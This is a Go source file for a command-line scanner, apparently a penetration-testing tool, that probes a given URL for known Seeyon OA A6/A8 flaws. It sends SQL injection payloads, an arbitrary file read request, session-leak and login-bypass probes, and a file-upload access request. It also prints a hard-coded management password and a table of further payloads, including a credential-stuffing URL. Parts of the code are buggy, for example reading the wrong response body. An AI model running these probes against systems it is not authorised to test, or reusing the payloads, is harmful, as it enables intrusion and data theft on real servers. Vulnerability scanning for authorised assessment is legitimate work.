package main

import (
	"flag"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
)
import "fmt"
var url string
func main(){
	flag.StringVar(&url,"u","","需要检测的url")
	flag.Parse()
	if len(os.Args) == 1{
		v()
		color.Red("use: " +os.Args[0] +  " " + "show"+ "   显示检测模块")
		color.Green("use: " + os.Args[0] + " " + "-u url" + "   开始检测")
		os.Exit(0)
	}
	if len(os.Args) ==2  && os.Args[1] == "show"{
		start()
		os.Exit(0)
	}
	if url == ""{
		v()
		fmt.Println("请输入要检测的url")
		os.Exit(0)
	}
	v()
	resp,err := http.Get(url)
	if err != nil{
		fmt.Println("网站可能不存活,检测失败,请手动尝试")
		os.Exit(0)
	}
	defer resp.Body.Close()
	setextno()
	dotype()
	createMysql()
	htmlofficeservlet()
	isNotInTable()
	wsdl()
	status()
	officeDown()
	getSessionList()
	thirdpartyController()
}
func createMysql() {
	fmt.Println("正在检测 : 致远OA A6 敏感信息泄露（一）")
	resp, err := http.Get(url + "/yyoa/createMysql.jsp")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	if resp.ContentLength > 2 && resp.StatusCode == 200 {
		color.Red("存在 : 致远OA A6 敏感信息泄露（一）")
		fmt.Println("payload ： /yyoa/createMysql.jsp")
	}


	resp1, _ := http.Get(url + "/yyoa/createMysql.jsp")
	defer resp1.Body.Close()
	body1, err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil {
		errors()
	}
	if len(string(body1)) > 2 && resp.StatusCode == 200 {
		color.Red("存在 : 致远OA A6 敏感信息泄露（一）")
		fmt.Println("payload ： /yyoa/ext/createMysql.jsp")
	}
}
func dotype(){
	fmt.Println("正在检测 : 致远OA A6 test.jsp sql注入漏洞")
	resp,_ := http.Get(url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123456))")
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	if err != nil{
		errors()
	}
	str := string(body)
	if strings.Contains(str,"e10adc3949ba59abbe56e057f20f883e"){
		color.Red("存在 : 致远OA A6 test.jsp sql注入漏洞")
		fmt.Println("payload : /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123456))")
	}

	resp1,_ := http.Get(url + "/yyoa/common/js/menu/test.jsp;1.js?doType=101&S1=(SELECT%20md5(123456))")
	defer resp1.Body.Close()
	body1,err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil{
		errors()
	}
	str1 := string(body1)
	if strings.Contains(str1,"e10adc3949ba59abbe56e057f20f883e"){
		color.Red("存在 : 致远OA A6 test.jsp sql注入漏洞  ---- 1Day(202105)")
	}
}
func setextno(){
	fmt.Println("正在检测 : 致远OA A6 setextno.jsp sql注入漏洞")
	resp,_ := http.Get(url + "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,md5(123456),4#")
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	if err != nil {
		errors()
	}
	str := string(body)
	if strings.Contains(str,"e10adc3949ba59abbe56e057f20f883e"){
		color.Red("存在 : 致远OA A6 setextno.jsp sql注入漏洞")
		fmt.Println("payload : /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,md5(123456),4#")
	}
}
func htmlofficeservlet(){
	fmt.Println("正在检测 : 致远 OA A8 htmlofficeservlet getshell 漏洞")
	resp,_ := http.Get(url + "/seeyon/htmlofficeservlet")
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	if err != nil {
		errors()
	}
	str := string(body)
	if strings.Contains(str,"htmoffice operate err"){
		color.Red("存在 : 致远OA A6 setextno.jsp sql注入漏洞(可能!!!)")
		fmt.Println("payload : http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/")
	}
}
func isNotInTable(){
	fmt.Println("正在检测 : 致远OA A6 重置数据库账号密码漏洞")
	resp,_ := http.Get(url + "/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(123456)%23")
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	if err != nil {
		errors()
	}
	str := string(body)
	if strings.Contains(str,"e10adc3949ba59abbe56e057f20f883e"){
		color.Red("存在 : 致远OA A6 重置数据库账号密码漏洞")
		fmt.Println("payload : /yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select user()%23")
	}
}
func wsdl(){
	fmt.Println("正在检测 : 致远OA A8 任意用户密码修改漏洞")
	resp,err := http.Get(url + "/seeyon/services/authorityService?wsdl")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	if resp.StatusCode != 404{
		color.Red("存在 : 致远OA A8 任意用户密码修改漏洞(可能!!! 需进一步验证)")
		fmt.Println("payload : http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20A8%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E.md?btwaf=17820194")
	}
}
func status(){
	fmt.Println("正在检测 : 致远OA A8 未授权访问")
	resp,err := http.Get(url + "/seeyon/management/status.jsp")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	if resp.StatusCode == 200{
		color.Red("存在 : 致远OA A8 未授权访问")
		fmt.Println("payload : /seeyon/management/status.jsp   密码:WLCCYBD@SEEYON  成功之后 输入 logi")
	}
}
func officeDown(){
	fmt.Println("正在检测 : 致远OA A8 任意文件读取漏洞")
	resp,err := http.Get(url + "/seeyon/main.do?method=officeDown&filename=c:/boot.ini")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	if resp.StatusCode == 200{
		color.Red("存在 : 致远OA A8 任意文件读取漏洞")
		fmt.Println("payload : /seeyon/main.do?method=officeDown&filename=c:/boot.ini")
	}
}
func getSessionList(){
	fmt.Println("正在检测 : 致远OA Session泄漏漏洞")
	resp,err := http.Get(url + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	body,err := ioutil.ReadAll(resp.Body)
	str := string(body)
	if resp.StatusCode == 200 && len(str) > 1{
		color.Red("存在 : 致远OA Session泄漏漏洞")
		fmt.Println("payload : /yyoa/ext/https/getSessionList.jsp?cmd=getAll")
	}
}
func thirdpartyController(){
	fmt.Println("正在检测 : 致远OA Session泄露 任意文件上传漏洞")
	resp,err := http.Post(url + "/seeyon/thirdpartyController.do","application/x-www-form-urlencoded",strings.NewReader("method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"))
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	body,err := ioutil.ReadAll(resp.Body)
	str := string(body)
	if resp.StatusCode == 200 && len(str) > 1 && strings.Contains(str,"a8genius.do"){
		color.Red("存在 : 致远OA Session泄露 任意文件上传漏洞")
		fmt.Println("payload : http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md?btwaf=23465101")
	}
}
func ajax(){
	fmt.Println("正在检测 : 致远OA ajax.do登录绕过任意文件上传")
	resp,err := http.Get(url + "seeyon/thirdpartyController.do.css/..;/ajax.do")
	defer resp.Body.Close()
	if err != nil {
		errors()
	}
	body,err := ioutil.ReadAll(resp.Body)
	str := string(body)
	if resp.StatusCode == 200 && strings.Contains(str,"java 出现异常"){
		color.Red("存在 : 致远OA ajax.do登录绕过任意文件上传")
		fmt.Println("payload : 找我")
	}

}
func start(){
	data := [][]string{
		[]string{"是", "致远OA-A6-setextno.jsp-sql注入漏洞", ""},
		[]string{"否", "致远OA-A6-search_result.jsp-sql注入漏洞", "/yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notAr"},
		[]string{"是", "致远OA-A6-test.jsp-sql注入漏洞", ""},
		[]string{"是", "致远OA-A6-敏感信息泄露（一）", ""},
		[]string{"否", "致远OA-A6-敏感信息泄露（二）", "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id="},
		[]string{"是", "致远-OA-A8-htmlofficeservlet-getshell-漏洞", ""},
		[]string{"是", "致远OA-A6-重置数据库账号密码漏洞", ""},
		[]string{"是", "致远OA-A8-未授权访问", ""},
		[]string{"是", "致远OA-A8-任意文件读取漏洞", ""},
		[]string{"否", "致远OA-A8-v5任意用户密码修改(需要一个合法的JSESSIONID)", "http://t.hk.uy/nzs"},
		[]string{"否", "致远OA-A8-v5无视验证码撞库", "/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456"},
		[]string{"是", "致远OA-Session泄漏漏洞", ""},
		[]string{"是", "致远OA-Session泄露-任意文件上传漏洞", "http://t.hk.uy/nyX"},
		[]string{"否", "致远OA-帆软报表组件前台XXE漏洞", "http://t.hk.uy/nzv http://t.hk.uy/nzw"},
		[]string{"是", "致远OA-ajax.do登录绕过任意文件上传", ""},
	}
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"检查", "漏洞名称", "Poc/参考"})
	for _, v := range data {
		table.Append(v)
	}
	table.Render()
}
func errors(){
	fmt.Println("读取页面返回失败,请手工判断")
}
func v(){
	color.Cyan("              _                                     _                     _       ")
	color.Red("             | |                             _     ( )     _             | |      ")
	color.Yellow("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	color.Blue(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	color.Magenta(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	color.Green(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
}